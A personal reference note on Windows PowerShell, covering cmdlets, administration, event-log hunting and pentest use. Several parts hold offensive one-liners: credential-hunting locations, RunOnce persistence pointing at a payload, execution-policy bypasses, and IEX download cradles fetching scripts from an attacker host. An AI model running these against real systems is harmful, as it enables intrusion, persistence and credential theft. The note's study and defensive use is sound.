Tags: #Status/In-Progress #Type/Knowledge #Context/Windows #Context/Programming #publish-me

---
## Overview
Windows PowerShell is an object-oriented scripting language and shell designed for system administration and automation in Windows environments. Unlike CMD which works with plain text, PowerShell works with objects that have properties and methods — making it significantly more powerful for automation, filtering, and remote management. It is built into modern Windows and is the primary tool for managing Active Directory, services, processes, and network configurations.

---

## Terminology
| Term | Definition |
|------|------------|
| Object | Core element in PowerShell; contains properties (data) and methods (functions) |
| Property | Attribute of an object (e.g., `Name`, `Length`, `Extension`) |
| Method | Function associated with an object (e.g., `.ToUpper()`, `.GetType()`) |
| Cmdlet | Specialized PowerShell command in verb-noun format (e.g., `Get-Process`) |
| Pipeline (`\|`) | Passes output from one cmdlet as input to the next |
| Module | Collection of related cmdlets, functions, and scripts |
| Alias | Shorthand name for a cmdlet (e.g., `ls` = `Get-ChildItem`) |

---
## Core Concepts

### Accessing PowerShell
- Windows Search → "PowerShell" → Enter
- Windows Terminal (modern terminal that supports multiple shells)
- Windows PowerShell ISE — built-in IDE for writing, debugging, and testing scripts
- From CMD: type `powershell` to switch into a PowerShell session

### Getting Started
| Command | Description |
|---------|-------------|
| `Get-Command` | List all available cmdlets, functions, aliases, and scripts |
| `Get-Command -verb get` | Filter commands by verb |
| `Get-Command -noun windows*` | Filter commands by noun |
| `Get-Command -CommandType "Function"` | Show only functions |
| `Get-Command -Module <ModuleName>` | See all cmdlets, aliases, and functions exported by a specific module |
| `Get-Alias` | Display all configured aliases |
| `Set-Alias -Name <alias> -Value <cmdlet>` | Create a custom shorthand alias for a cmdlet |
| `Get-Help <cmdlet>` | Show help for a cmdlet |
| `Get-Help <cmdlet> -Examples` | Show usage examples for any cmdlet |
| `Get-Help <cmdlet> -online` | Open Microsoft documentation in browser |
| `Update-Help` | Update locally cached help documentation |

### Command History
PowerShell tracks history in two ways:

1. **Session history** — commands from the current session only
2. **PSReadLine** — persistent history across all sessions (last 4096 commands by default, controlled by `$MaximumHistoryCount`)

PSReadLine history file location: `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

PSReadLine automatically attempts to filter API keys, passwords, and `-AsPlainText` strings.

| Command | Description |
|---------|-------------|
| `Get-History` | Show commands run in the current session |
| `r <number>` | Recall and re-run a command by its history number |
| `Get-Content (Get-PSReadlineOption).HistorySavePath` | View full persistent command history from PSReadLine |
| `Clear-Host` | Clear the terminal screen |

#### Hotkeys
| Shortcut | Action |
|----------|--------|
| `CTRL + R` | Searchable command history |
| `CTRL + L` | Quick screen clear |
| `CTRL + ALT + SHIFT + ?` | Print all keyboard shortcuts |
| `F7` | TUI scrollable history list |
| `SHIFT + TAB` | Autocomplete backward |
| `Escape` | Clear the current line while typing |

### File System Management
| Command | Aliases | Description |
|---------|---------|-------------|
| `Get-Item <path>` | `gi` | Retrieve an object — file, folder, registry key, etc. |
| `Get-ChildItem <path>` | `ls`, `dir`, `gci` | List contents of a directory |
| `Set-Location <path>` | `cd` | Change working directory |
| `Get-Location` | `pwd` | Print current working directory |
| `New-Item -Path <path> -ItemType File` | `md`, `mkdir`, `ni` | Create a new file or directory |
| `Set-Item <path>` | `si` | Modify the value of a property on an object |
| `Copy-Item -Path <src> -Destination <dest>` | `copy`, `cp`, `ci` | Copy files or directories |
| `Rename-Item <path> -NewName <name>` | `ren`, `rni` | Rename a file or directory |
| `Remove-Item <path>` | `rm`, `del`, `rmdir` | Delete a file or directory |
| `Get-Content <file>` | `cat`, `type` | Read and display the contents of a file |
| `Add-Content <file> -Value "<text>"` | `ac` | Append text to a file without overwriting it |
| `Set-Content <file> -Value "<text>"` | `sc` | Overwrite all contents of a file with new data |
| `Clear-Content <file>` | `clc` | Erase file contents while keeping the file itself |
| `Compare-Object <ref> <diff>` | `diff`, `compare` | Compare two objects or files and show differences |

Bulk rename example — change all `.txt` files to `.md`:
`Get-ChildItem -Path *.txt | Rename-Item -NewName {$_.name -replace ".txt",".md"}`

### PowerShell Objects
Everything in PowerShell is an object — a structured item with properties (data) and methods (actions). Understanding objects is essential for filtering and automation.

| Concept | Definition |
|---------|------------|
| Object | An individual instance of a class (e.g., a running process, a file) |
| Class | The blueprint defining what properties and methods an object has |
| Property | A data attribute on an object (e.g., `Name`, `Status`, `Length`) |
| Method | An action the object can perform (e.g., `.Start()`, `.ToUpper()`) |

| Command | Description |
|---------|-------------|
| `Get-LocalUser administrator \| Get-Member` | Show all properties and methods available on an object |
| `Get-LocalUser administrator \| Select-Object -Property *` | Return all property values for an object |
| `Get-LocalUser * \| Select-Object -Property Name,PasswordLastSet` | Return only specific properties |
| `Get-LocalUser * \| Sort-Object -Property Name \| Group-Object -Property Enabled` | Sort by name, then group by a property value |

### Piping, Filtering, and Sorting
PowerShell pipelines pass objects between cmdlets, enabling powerful chaining.

| Operator | Description | Example |
|----------|-------------|---------|
| `\| Sort-Object <property>` | Sort by a property | `\| Sort-Object Length` |
| `\| Select-Object <props>` | Return only specified properties | `\| Select-Object Name,Length` |
| `\| Where-Object -Property <prop> -eq <value>` | Filter by property value | `\| Where-Object -Property Extension -eq ".txt"` |
| `Select-String -Path <path> -Pattern <term>` | Grep-like pattern search inside files; outputs file name, line number, and matching line | `Select-String -Path C:\logs\* -Pattern "password"` |

Comparison operators for `Where-Object`:

| Operator | Description |
|----------|-------------|
| `-eq` | Exact match (case-insensitive) |
| `-ne` | Not equal |
| `-gt` / `-ge` | Greater than / greater than or equal |
| `-lt` / `-le` | Less than / less than or equal |
| `-like` | Wildcard match (e.g., `-like "*admin*"`) |
| `-contains` | Check if any item in a collection matches exactly |
| `-match` | Regular expression match |
| `-not` | Matches if property is blank, does not exist, or is `$False` |

Pipeline chaining operators (PowerShell 7+):
- `&&` — Run next command only if current one succeeds
- `||` — Run next command only if current one fails

#### Finding Files Recursively
`Get-ChildItem -Path C:\Users\<user>\ -File -Recurse -ErrorAction SilentlyContinue`

Filter by extension: `where {($_.Name -like "*.txt" -or $_.Name -like "*.csv")}`

Search inside files for keywords:
`Get-ChildItem -Path C:\Users\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"`

### Pentest Recon — Valuable Locations
When operating on a target host, these locations commonly contain sensitive files:

| Location | What to Look For |
|----------|-----------------|
| `C:\Users\<user>\AppData\` | Config files, saved credentials, temp saves |
| `C:\Users\<user>\` | VPN configs, SSH keys (add `-Hidden` flag to see hidden files) |
| `(Get-PSReadlineOption).HistorySavePath` | Path to PSReadLine command history file — may contain typed credentials or command sequences |
| `Get-Clipboard` | Check current clipboard contents for copied credentials or tokens |

Read PowerShell console history directly: `Get-Content (Get-PSReadlineOption).HistorySavePath`

---

### System Information & Analysis
| Command | Description |
|---------|-------------|
| `Get-ComputerInfo` | Comprehensive system information (OS, hardware, BIOS) |
| `Get-Process` | View all running processes |
| `Get-Service` | Get status of all services |
| `Get-NetTCPConnection` | Display current TCP connections |
| `Get-FileHash <file>` | Generate a file hash (default SHA256; use `-Algorithm MD5` etc.) |

### Networking
| Command | Description |
|---------|-------------|
| `Get-NetIPConfiguration` | Full network interface configuration (IP, gateway, DNS) |
| `Get-NetIPAddress` | IP address details for each adapter |
| `Get-NetIPInterface` | All visible adapter properties broken down by address family |
| `Get-NetIPAddress -ifIndex <n>` | View IP address for a specific interface (get ifIndex from `Get-NetIPInterface`) |
| `Get-NetNeighbor` | ARP-equivalent neighbor table entries |
| `Get-NetRoute` | Current routing table |
| `Set-NetAdapter -Name <name>` | Set basic adapter properties at layer 2 |
| `Set-NetIPInterface -InterfaceIndex <n> -Dhcp Disabled` | Disable DHCP on an interface to prepare for static IP |
| `Set-NetIPAddress -InterfaceIndex <n> -IPAddress <ip> -PrefixLength <cidr>` | Assign a static IP; `PrefixLength` is the CIDR subnet mask (e.g., 24 = 255.255.255.0) |
| `New-NetIPAddress -InterfaceIndex <n> -IPAddress <ip> -PrefixLength <cidr>` | Create and configure a new IP address on an adapter |
| `Disable-NetAdapter -Name <name>` | Disable a network adapter |
| `Enable-NetAdapter -Name <name>` | Re-enable a disabled adapter |
| `Restart-NetAdapter -Name <name>` | Restart an adapter to apply configuration changes |
| `Test-NetConnection -ComputerName <host>` | Connectivity test; supports `-Port` for TCP port checks |

### User & Group Management

#### Local Users
| Command | Description |
|---------|-------------|
| `Get-LocalUser` | List all local user accounts |
| `New-LocalUser -Name <name> -NoPassword` | Create a local user account with no password |
| `$pw = Read-Host -AsSecureString` | Prompt for a password and store it securely (hides input) |
| `Set-LocalUser -Name <name> -Password $pw -Description "<desc>"` | Set a password and description on an existing user |
| `Get-LocalGroup` | List all local groups |
| `Get-LocalGroupMember -Name "<group>"` | Show members of a specific local group |
| `Add-LocalGroupMember -Group "<group>" -Member "<user>"` | Add a user to a local group |

#### Domain Users (requires RSAT ActiveDirectory module)
Install RSAT to get the ActiveDirectory PowerShell module:
`Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online`

Or install only the AD tools: `Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0`

| Command | Description |
|---------|-------------|
| `Get-ADUser -Filter *` | List all AD users |
| `Get-ADUser -Identity <name>` | Get details for a specific user (by SamAccountName, DN, GUID, or SID) |
| `Get-ADUser -Filter {EmailAddress -like '*domain.corp'}` | Filter users by any AD attribute |
| `New-ADUser -Name <sam> -Surname <last> -GivenName <first> -Enabled $true -AccountPassword (Read-Host -AsSecureString "Password")` | Create a new AD user |
| `Set-ADUser -Identity <name> -Description "<text>"` | Modify an attribute on an AD user account |
| `Get-ADUser -Identity <name> -Properties * \| Format-Table` | Show all AD attributes for a user |

### Service Management
Services are background processes that manage components for the OS and applications. Three categories: Local Services, Network Services, and System Services.

| Command | Description |
|---------|-------------|
| `Get-Help *-Service` | List all available service-related cmdlets |
| `Get-Service` | List all services and their status |
| `Get-Service \| ft DisplayName,Status` | Display services as a compact table |
| `Get-Service \| Where-Object {$_.Status -eq "Running"}` | Filter to only running services |
| `Get-Service \| Where-Object DisplayName -like '*Defender*' \| ft` | Search services by display name |
| `Get-Service spooler \| Select-Object -Property Name,StartType,Status,DisplayName` | Detailed view of a specific service |
| `Start-Service -Name <service>` | Start a service |
| `Stop-Service -Name <service>` | Stop a service |
| `Restart-Service -Name <service>` | Restart a service |
| `Set-Service -Name <service> -StartType Disabled` | Change a service's startup type |
| `Remove-Service <service>` | Delete a service (PowerShell 7+ only; use `sc.exe delete` on older versions) |

#### Remote Service Management
| Command | Description |
|---------|-------------|
| `Get-Service -ComputerName <hostname>` | List services on a remote host |
| `Get-Service -ComputerName <hostname> \| Where-Object {$_.Status -eq "Running"}` | Filter remote services to running only |
| `Invoke-Command -ComputerName <host1>,<host2> -ScriptBlock {Get-Service -Name 'windefend'}` | Check a specific service on multiple hosts simultaneously |

### Scheduled Tasks
| Command | Description |
|---------|-------------|
| `Get-ScheduledTask` | List all scheduled tasks |
| `Get-ScheduledTask \| Where-Object {$_.TaskPath -like "\*"}` | Filter tasks by path |
| `Get-ScheduledTask -TaskName "<name>" \| Get-ScheduledTaskInfo` | Get last run time and result |

### Working with the Registry
The Windows Registry is a hierarchical database storing configuration for the OS, hardware, and software. PowerShell can navigate the registry like a file system using the `HKLM:` and `HKCU:` PSDrive paths.

#### Registry Hives
| Hive | Abbreviation | Stores |
|------|-------------|--------|
| `HKEY_LOCAL_MACHINE` | `HKLM` | Computer-wide hardware, OS, and driver settings |
| `HKEY_CURRENT_USER` | `HKCU` | Settings specific to the currently logged-in user |
| `HKEY_CLASSES_ROOT` | `HKCR` | File type associations and COM class registrations |
| `HKEY_USERS` | `HKU` | Default user profile and all loaded user profiles |
| `HKEY_CURRENT_CONFIG` | `HKCC` | Hardware profile variance from the default HKLM config |

Hive files are stored in `C:\Windows\System32\Config\`. See https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives for full details.

#### Reading the Registry
| Command | Description |
|---------|-------------|
| `Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\<key>` | Read a registry key and list its value names |
| `Get-ItemProperty -Path HKLM:\SOFTWARE\<key>` | Read all values and data under a key (more readable than Get-Item) |
| `Get-ChildItem -Path HKLM:\SOFTWARE\<key> -Recurse` | Recursively list all subkeys and values under a path |
| `Get-Item -Path HKLM:\...\Run \| Select-Object -ExpandProperty Property` | List the names of all values in a Run key — good for finding persistence |

#### Searching the Registry (reg.exe)
`REG QUERY HKCU /F "Password" /t REG_SZ /S /K` — search HKCU recursively for key names (`/K`) containing the word "Password" in string values (`/t REG_SZ`)

| Flag | Description |
|------|-------------|
| `/F <pattern>` | Pattern to search for |
| `/t <type>` | Value type to search (e.g., `REG_SZ` for strings) |
| `/S` | Search recursively through all subkeys |
| `/K` | Search key names only (not value data) |

#### Creating and Modifying Registry Keys
| Command | Description |
|---------|-------------|
| `New-Item -Path HKCU:\SOFTWARE\...\RunOnce\ -Name TestKey` | Create a new registry key |
| `New-ItemProperty -Path HKCU:\...\TestKey -Name "access" -PropertyType String -Value "C:\payload.exe"` | Add a new string value to an existing key |
| `Set-ItemProperty -Path HKCU:\...\TestKey -Name "access" -Value "C:\newpath.exe"` | Modify the data of an existing registry value |
| `Remove-ItemProperty -Path HKCU:\...\TestKey -Name "access"` | Delete a specific registry value |

reg.exe equivalent for creating a RunOnce value:
`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\payload.exe"`

### Execution Policy
Controls whether PowerShell scripts can execute. Commonly bypassed during engagements.

| Policy | Description |
|--------|-------------|
| `AllSigned` | All scripts must be signed by a trusted publisher |
| `Bypass` | No restrictions; no warnings |
| `Default` | `Restricted` on desktop; `RemoteSigned` on servers |
| `RemoteSigned` | Local scripts run freely; remote scripts must be signed |
| `Restricted` | No scripts allowed; individual commands only |
| `Undefined` | No policy set; defaults to `Restricted` |
| `Unrestricted` | Default for non-Windows; unsigned scripts run with a warning |

| Command | Description |
|---------|-------------|
| `Get-ExecutionPolicy -List` | View policy for all scopes |
| `Set-ExecutionPolicy Bypass -Scope Process` | Bypass for current session only |
| `Set-ExecutionPolicy Bypass -Scope CurrentUser` | Bypass for current user permanently |

Common execution policy bypass one-liners:
`powershell -ExecutionPolicy Bypass -File .\script.ps1`
`powershell -ep bypass -c "IEX (Get-Content script.ps1 -Raw)"`

### Windows Event Log — Get-WinEvent
`Get-WinEvent` queries Windows event logs. Use `FilterHashtable` for efficient server-side filtering rather than piping everything through `Where-Object` — FilterHashtable pushes the filter to the log provider, which is significantly faster on large logs. See [[Windows Event Logs]] for Event ID reference and log architecture.

#### Basic Queries

| Command | Description |
|---------|-------------|
| `Get-WinEvent -ListLog * \| Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType \| Format-Table -AutoSize` | List all logs with metadata — log mode (Circular/Retain/AutoBackup), type (Administrative/Analytical/Debug/Operational), and record counts |
| `Get-WinEvent -ListProvider * \| Format-Table -AutoSize` | Show all registered log providers |
| `Get-WinEvent -ListLog Security` | Get configuration details for the Security log |
| `Get-WinEvent -LogName 'Security' -MaxEvents 5 \| Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message \| Format-Table -AutoSize` | Retrieve the 5 most recent Security log events with key properties |
| `Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 30 \| Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message \| Format-Table -AutoSize` | Query a non-default log (WinRM operational events) |
| `Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -Oldest -MaxEvents 30 \| Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message \| Format-Table -AutoSize` | Retrieve the 30 **oldest** events instead of the most recent |

#### Reading .evtx Files
Query exported or collected `.evtx` log files — useful for offline forensic analysis and scripted log processing.

`Get-WinEvent -Path 'C:\Logs\sample.evtx' -MaxEvents 5 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize`

#### FilterHashtable — Efficient Server-Side Filtering
FilterHashtable pushes filtering to the event log provider (fast). Supports `LogName`, `Path`, `ID`, `Level`, `StartTime`, `EndTime`, `Data`, and `UserID`.

```powershell
# Filter Sysmon for process creation (ID 1) and network connections (ID 3)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3} |
  Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

# Same query against an exported .evtx file
Get-WinEvent -FilterHashtable @{Path='C:\Logs\sysmon.evtx'; ID=1,3} |
  Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

# Filter by date range (StartTime inclusive, EndTime exclusive)
$startDate = (Get-Date -Year 2023 -Month 5 -Day 28).Date
$endDate = (Get-Date -Year 2023 -Month 6 -Day 3).Date
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3; StartTime=$startDate; EndTime=$endDate} |
  Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
```

#### FilterXML — Structured XML Queries
FilterXML supports the same query syntax as Event Viewer's manual XML filter. Useful when FilterHashtable cannot express the condition (e.g., filtering on specific EventData field values).

```powershell
# Detect loading of clr.dll or mscoree.dll (Sysmon Event ID 7 — .NET injection indicator)
$Query = @"
<QueryList>
  <Query Id="0">
    <Select Path="Microsoft-Windows-Sysmon/Operational">
      *[System[(EventID=7)]] and *[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']]
    </Select>
  </Query>
</QueryList>
"@
Get-WinEvent -FilterXml $Query | ForEach-Object { Write-Host $_.Message `n }
```

#### FilterXPath — XPath-Based Field Filtering
FilterXPath allows targeting specific EventData fields by name — more precise than FilterXML for matching named data elements.

```powershell
# Find Sysmon Event ID 1 matching a specific Image and CommandLine (e.g., Sysinternals install)
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' `
  -FilterXPath "*[EventData[Data[@Name='Image']='C:\Windows\System32\reg.exe']] and *[EventData[Data[@Name='CommandLine']='`"C:\Windows\system32\reg.exe`" ADD HKCU\Software\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f']]" |
  Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

# Find Sysmon network connections (ID 3) to a specific destination IP
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' `
  -FilterXPath "*[System[EventID=3] and EventData[Data[@Name='DestinationIp']='<destination-ip>']]"
```

#### Parsing Event XML — Extracting Specific Fields
`Get-WinEvent` events expose full XML via `.ToXml()`. Parse this to extract specific named data fields into structured PowerShell objects for further filtering and analysis.

```powershell
# Extract SourceIP, DestinationIP, and ProcessGuid from all Sysmon network connection events,
# then filter for a specific destination IP
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
ForEach-Object {
  $xml = [xml]$_.ToXml()
  $eventData = $xml.Event.EventData.Data
  New-Object PSObject -Property @{
    SourceIP      = $eventData | Where-Object {$_.Name -eq "SourceIp"}      | Select-Object -ExpandProperty '#text'
    DestinationIP = $eventData | Where-Object {$_.Name -eq "DestinationIp"} | Select-Object -ExpandProperty '#text'
    ProcessGuid   = $eventData | Where-Object {$_.Name -eq "ProcessGuid"}   | Select-Object -ExpandProperty '#text'
    ProcessId     = $eventData | Where-Object {$_.Name -eq "ProcessId"}     | Select-Object -ExpandProperty '#text'
  }
} | Where-Object {$_.DestinationIP -eq "<destination-ip>"}
# ProcessGuid can be used to pivot back to the originating process (cross-reference Event ID 1)
```

#### Property-Based Filtering
Event objects expose data via the `.Properties[]` array. Each Sysmon event type has a fixed property order — index 21 on Event ID 1 is `ParentCommandLine`. Useful for quick scripted hunting without XML parsing.

```powershell
# See all available properties for a single event (discovery step)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 1 |
  Select-Object -Property *

# Find all Sysmon process creation events where the parent used -enc (encoded PowerShell)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} |
  Where-Object {$_.Properties[21].Value -like "*-enc*"} | Format-List
# Properties[21] = ParentCommandLine for Sysmon Event ID 1

# Hunt for share creation events across a folder of exported .evtx files
Get-WinEvent -FilterHashtable @{Path='C:\Logs\LateralMovement\*'} |
  Where-Object {$_.ID -like '5142'} | Select-Object -Property *
```

See [[Log Fundamentals]] for key event IDs. Refer to https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/ for the full event ID encyclopedia.

More Get-WinEvent examples: https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/

### WMI Cmdlets
WMI provides deep access to hardware, OS, processes, services, and configuration. `Get-CimInstance` is the modern replacement for `Get-WmiObject`.

| Command | Description |
|---------|-------------|
| `Get-WmiObject -Class Win32_OperatingSystem` | Detailed OS information |
| `Get-WmiObject -Class Win32_OperatingSystem \| select Version,BuildNumber` | Quick OS version check |
| `Get-WmiObject -Class Win32_Process` | All running processes |
| `Get-WmiObject -Class Win32_Service` | All services |
| `Get-WmiObject -Class Win32_Bios` | BIOS information |
| `Get-WmiObject -Class Win32_UserAccount` | Local user accounts |
| `Get-WmiObject -Class Win32_ComputerSystem` | Computer name, domain, manufacturer |
| `Get-WmiObject -Class Win32_NetworkAdapterConfiguration \| Where-Object {$_.IPEnabled}` | Active network adapters with IP config |
| `Get-CimInstance -ClassName Win32_OperatingSystem` | Modern equivalent of Get-WmiObject |
| `Invoke-WmiMethod -Path "CIM_DataFile.Name='<src>'" -Name Rename -ArgumentList "<dst>"` | Rename a file via WMI (return 0 = success) |

### Download Cradles & Web Interaction
Load and execute scripts in memory without writing to disk — commonly used in post-exploitation.

| Method | Command |
|--------|---------|
| Download and execute from URL | `IEX (New-Object Net.WebClient).DownloadString('http://<host>/script.ps1')` |
| Download file to disk (WebClient) | `(New-Object Net.WebClient).DownloadFile('http://<host>/file', 'C:\path\file')` |
| Invoke-WebRequest (download) | `Invoke-WebRequest -Uri 'http://<host>/file' -OutFile C:\path\file` |
| Load local script into memory | `IEX (Get-Content .\script.ps1 -Raw)` |
| Import module and run | `Import-Module .\PowerView.ps1` then call functions directly |
| Inline execution after import | `.\PowerView.ps1; Get-LocalGroup \| fl` |

`Invoke-WebRequest` (aliased as `wget`, `iwr`, `curl`) supports GET, POST, file download, authentication, and session management.

Inspect the response object with `Get-Member`:
`Invoke-WebRequest -Uri "http://<target>" -Method GET | Get-Member`

Show only images from a page: `Invoke-WebRequest -Uri "http://<target>" -Method GET | fl Images`

Serving files from an attack machine (Linux) for download on target:
`python3 -m http.server 8000` → then download with `Invoke-WebRequest -Uri "http://<attacker-ip>:8000/tool.ps1" -OutFile "C:\tool.ps1"`

### Permissions & ACLs
| Command | Description |
|---------|-------------|
| `Get-Acl -Path <path>` | View ACL on a file or directory |
| `Get-Acl -Path <path> \| Format-List` | Full formatted ACL output |
| `Get-Acl -Path HKLM:\System\CurrentControlSet\Services\<svc> \| Format-List` | View ACL on a registry service key |

### Module Management
| Command | Description |
|---------|-------------|
| `Get-Module` | List all modules currently loaded in the session |
| `Get-Module -ListAvailable` | Show all modules installed but not yet imported |
| `Import-Module <path or name>` | Load a module into the current session (enables its cmdlets) |
| `$env:PSModulePath` | Show the directories PowerShell searches for modules |
| `Find-Module -Name "<name>"` | Search PowerShell Gallery for a module |
| `Install-Module -Name "<name>"` | Download and install a module from PowerShell Gallery (requires admin) |

Add a module file to `C:\Users\<user>\Documents\WindowsPowerShell\Modules\` to make it permanently available.

Module file extensions:
- `.ps1` — executable PowerShell script
- `.psm1` — PowerShell module file; defines what functions a module contains
- `.psd1` — PowerShell data file; module manifest with metadata (version, author, dependencies, exports)

#### Notable PowerShell Modules for Pentesters
| Module | Purpose |
|--------|---------|
| `ActiveDirectory` | Official Microsoft module for managing AD users, groups, and computers |
| `AdminToolbox` | Community collection for sysadmins (AD, Exchange, network management) |
| `Empire / Situational Awareness` | Post-exploitation framework; provides C2 and enumeration capabilities |
| `Inveigh` | Network spoofing and MitM attacks (LLMNR/NBT-NS poisoning) |
| `BloodHound / SharpHound` | AD environment visualization; maps attack paths using graph analysis |

PowerShell Gallery: https://www.powershellgallery.com/

### Remote Execution
| Command | Description |
|---------|-------------|
| `Invoke-Command -ComputerName <host> -ScriptBlock { <command> }` | Execute a command on a remote host via WinRM |
| `Enter-PSSession -ComputerName <host> -Credential <user> -Authentication Negotiate` | Start an interactive PowerShell session on a remote host |
| `Test-WSMan -ComputerName <host>` | Check if WinRM is reachable on a remote host (no authentication) |
| `Test-WSMan -ComputerName <host> -Authentication Negotiate` | Test WinRM with authentication |

`Enter-PSSession` can also be used from Linux if PowerShell Core is installed. Once connected to a Windows CMD session via SSH, type `powershell` to upgrade to a PowerShell session.

WinRM hardening recommendations: restrict `TrustedHosts` to specific IPs, enforce HTTPS transport, and use Kerberos authentication on domain-joined systems. See [[Windows Remote Management]].

### Active Directory Commands
| Command | Description |
|---------|-------------|
| `Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose` | Reset a user's AD password |
| `Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose` | Force password reset at next logon |
| `gpupdate /force` | Force sync of Group Policy Objects on a computer |

### Scripting & Automation

#### Scripts vs Modules
| | Script | Module |
|--|--------|--------|
| File type | `.ps1` | `.psm1` (main) + `.psd1` (manifest) |
| Contains | Individual cmdlets and functions | Collection of scripts, functions, manifests, resources |
| Usage | Run directly with `.\script.ps1` | Imported with `Import-Module` then call its functions |

A module is a packaged collection — it can include multiple script files, a manifest defining dependencies and exports, and help documentation.

#### Module Structure
A PowerShell module requires four components:
1. A directory in `$env:PSModulePath` containing all files
2. A `.psd1` manifest declaring metadata, prerequisites, and exports
3. A `.psm1` code file with functions and logic
4. Optional: help files, additional scripts, and resources

Create a manifest: `New-ModuleManifest -Path <path.psd1> -PassThru`

The `-PassThru` flag displays the generated manifest content immediately. Only `ModuleVersion` is required; all other fields are optional.

#### Running Scripts
- Run a script file directly: `.\scriptname.ps1`
- Import a module for the session: `Import-Module .\module.psm1`
- Inline execution: `.\module.ps1; Invoke-FunctionName`

See the Execution Policy section above for bypassing script execution restrictions.

---

## Related Concepts
- [[Windows Fundamentals]]
- [[Windows Command Line]]
- [[Windows Event Logs]]
- [[Active Directory Basics]]
- [[Log Fundamentals]]
- [[Windows Remote Management]]

## Related Techniques
- [[Windows Pentest Playbook]]

## Related Tools
- [[Sysmon]]

---
## References / Images
- Microsoft PowerShell Documentation: https://learn.microsoft.com/en-us/powershell/
- Active Directory PowerShell module documentation
- https://www.powershellgallery.com/ — PowerShell module repository
- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators — Full comparison operator reference
- https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/ — Get-WinEvent examples
- https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/ — Execution policy bypass techniques
- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles — PowerShell profile locations
